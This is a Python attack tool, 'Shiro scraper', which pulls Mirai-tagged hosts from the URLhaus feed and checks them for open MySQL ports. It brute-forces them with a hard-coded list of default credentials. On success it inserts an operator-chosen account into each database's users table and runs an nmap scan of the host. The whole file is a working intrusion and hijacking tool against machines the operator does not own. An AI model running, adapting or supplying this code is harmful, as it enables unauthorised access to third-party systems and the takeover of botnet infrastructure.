"""
[!]: shiro scraper | re-written
----
[*]: original code by @LoreSenpai / Lore
----
[*]: re-write by @133-7 / X
----
links:
https://github.com/LoreSenpai
https://github.com/133-7
----
organization:
https://github.com/PRIN-T
"""
#-------------#
from requests import *
#-------------#
from socket   import socket, gethostbyname, AF_INET, SOCK_STREAM
from pymysql  import connect, cursors
from nmap     import PortScanner
from time     import sleep
#-------------#
from os       import system, name
from datetime import datetime
from colorama import Fore
#-------------#
WORDLIST = """
root:root
shiro:shiro
shiro:password
tohka:password
skid:skid
skid:password
mana:ouma
mana:password
mana:botnet
mirai:mirai
mirai:password
root:mirai
mirai:root
root:botnet
root:admin
admin:admin
root:123456
root:54321
root:
admin:password
root:12345
admin:
root:pass
root:password
admin:admin1234
root:1111
admin:1111
root:password
root:1234
root:user
admin:1234
admin:12345
admin:54321
admin:123456
admin:1234
admin:pass
"""
#-------------#
BANNER = f"""\033[38;2;255;95;255m\033[38;2;255;95;255m╔\033[38;2;210;95;255m═\033[38;2;180;95;255m╗  \033[38;2;170;95;255m╦\033[38;2;160;95;255m \033[38;2;140;110;255m╦  \033[38;2;110;140;240m╦  \033[38;2;100;150;230m╦\033[38;2;90;160;220m═\033[38;2;70;180;200m╗  \033[38;2;60;190;190m╔\033[38;2;25;230;170m═\033[38;2;0;255;152m╗
\033[38;2;255;95;255m\033[38;2;255;95;255m╚\033[38;2;210;95;255m═\033[38;2;180;95;255m╗  \033[38;2;170;95;255m╠\033[38;2;160;95;255m═\033[38;2;140;110;255m╣  \033[38;2;110;140;240m║  \033[38;2;100;150;230m╠\033[38;2;90;160;220m╦\033[38;2;70;180;200m╝  \033[38;2;60;190;190m║\033[38;2;25;230;170m \033[38;2;0;255;152m║
\033[38;2;255;95;255m\033[38;2;255;95;255m╚\033[38;2;210;95;255m═\033[38;2;180;95;255m╝  \033[38;2;170;95;255m╩\033[38;2;160;95;255m \033[38;2;140;110;255m╩  \033[38;2;110;140;240m╩  \033[38;2;100;150;230m╩\033[38;2;90;160;220m╚\033[38;2;70;180;200m═  \033[38;2;60;190;190m╚\033[38;2;25;230;170m═\033[38;2;0;255;152m╝\033[0m"""
#-------------#

def log(
    text: str, 
    type: int
    ) -> str:

    if   type == 1: 
        return '-' * 10 + f'\n[{Fore.GREEN}{datetime.now().strftime("%H:%M:%S")}{Fore.RESET}]: {text}'  # DEFAULT
    elif type == 2: 
        return '-' * 10 + f'\n[{Fore.RED}{datetime.now().strftime("%H:%M:%S")}{Fore.RESET}]: {text}'    # ERROR


class Shiro:
    
    def __init__(self, username: str, password: str):
        """[summary]

        Args:
            username (str): [desired username for injection]
            password (str): [desired password for injection]
        """
        self.username = username
        self.password = password
    

    def portscan(self, IP: str):
        """[summary]

        Args:
            IP (str): [internet protocol to portscan]
        """
        NMAP    = PortScanner()
        STATE   = None
        DETAILS = (
            IP,
            '1-10000',
            '-T4 -A -v --exclude-ports 21,21,22,23,25,53,69,80,443,3074,3306,5060,930'
        )

        while True:
            try:
                NMAP.scan(DETAILS)
                PORTS = NMAP[IP]['tcp'].keys()

                for PORT in PORTS:
                    STATE   = NMAP[IP]['tcp'][PORT]['state']
                    SERVICE = NMAP[IP]['tcp'][PORT]['name']

                    if STATE == 'open':
                        print(f'{PORT} | {STATE} | {SERVICE}')
            except: break


    def inject(self, IP: str):
        """[summary]

        Args:
            IP (str): [internet protocol to attempt SQLi]
        """
        for COMBO in WORDLIST.splitlines():
            if COMBO == '': continue

            USERNAME = COMBO[:COMBO.index(':'):]

            try:               PASSWORD = COMBO[COMBO.index(':') + 1:]
            except ValueError: PASSWORD = ''

            DETAILS = {
                'host': IP,
                'user': USERNAME,
                'password': PASSWORD,
                'charset': 'utf8mb4',
                'cursorclass': cursors.DictCursor,
                'read_timeout': 5,
                'write_timeout': 5,
                'connect_timeout': 5
            }

            print(log('attempting sql injection ;-)', 1))

            try:
                conn = connect(**DETAILS)
                print(log(
                    f'we\'ve connected to {IP}! | username: {USERNAME} | password: {PASSWORD}', 1))
                cursor = conn.cursor()

                cursor.execute('show databases')
                for a_dict in cursor.fetchall():
                    for db in a_dict:
                        try:
                            cursor.execute(f'use {a_dict[db]};')

                            print(log(f'now attempting injection | {a_dict[db]}', 1))
                            cursor.execute("INSERT INTO users VALUES (NULL, '{}', '{}', 0, 0, 0, 0, -1, 1, 30, '');".format(
                                self.username, self.password
                            ))

                            print(log(f'injection complete -> {IP} | username: {self.username} | password: {self.password}', 1))
                            self.portscan(IP)
                        except Exception as E: print(E)
            except Exception as E: print(log(E, 2))


    def check(self, IP: str) -> bool:
        """[summary]

        Args:
            IP (str): [internet protocol to attempt connection / check alive]

        Returns:
            bool: [return true / false if alive or dead]
        """
        PORT = 3306
        CONN = IP, PORT

        S = socket(AF_INET, SOCK_STREAM)
        S.settimeout(2)

        try: 
            S.connect(CONN)
            return True
        except:
            return False


    def search(self, timeout: int = 2):
        """[summary]

        Args:
            timeout (int, optional): [delay between search]. Defaults to 2.
        """
        ABUSE_CH_DATA = 'https://urlhaus.abuse.ch/downloads/csv_recent/'
        ABUSE_CH_DATA = get(ABUSE_CH_DATA).text.split('\n')
        #-------------#
        ATTEMPTED     = []
        TYPE          = 'mirai'
        #-------------#

        while True:
            try:
                for LINE in ABUSE_CH_DATA:
                    
                    if not TYPE in LINE.lower():
                        continue
                    
                    IP = LINE.split(',')[2].split('://')[1].split('/')[0]
                    
                    if IP.count('.') == 3:
                        try:    IP = gethostbyname(IP)
                        except: continue
                    
                    if IP in ATTEMPTED: continue
                    else:    ATTEMPTED.append(IP)

                    if self.check(IP) == True:
                        log(f'mirai was found! | host: {IP}', 1); self.inject(IP)
                    
                    sleep(timeout)
            except KeyboardInterrupt: exit()
            except Exception as E:    print(log(E, 2))


if __name__ == '__main__':
    TITLE = '[Shiro Scraper ║ ~ By Lore ~ Re-Written By 133-7 / X]'
    if name == 'nt': system(f'cls && title {TITLE}')
    else:            system('clear'); __import__('sys').stdout.write(f"\x1b]2;{TITLE}\x07")


    print(BANNER)
    USERNAME = input(log('desired username : ', 1))
    PASSWORD = input(log('desired password : ', 1))

    S = Shiro(USERNAME, PASSWORD)
    S.search()
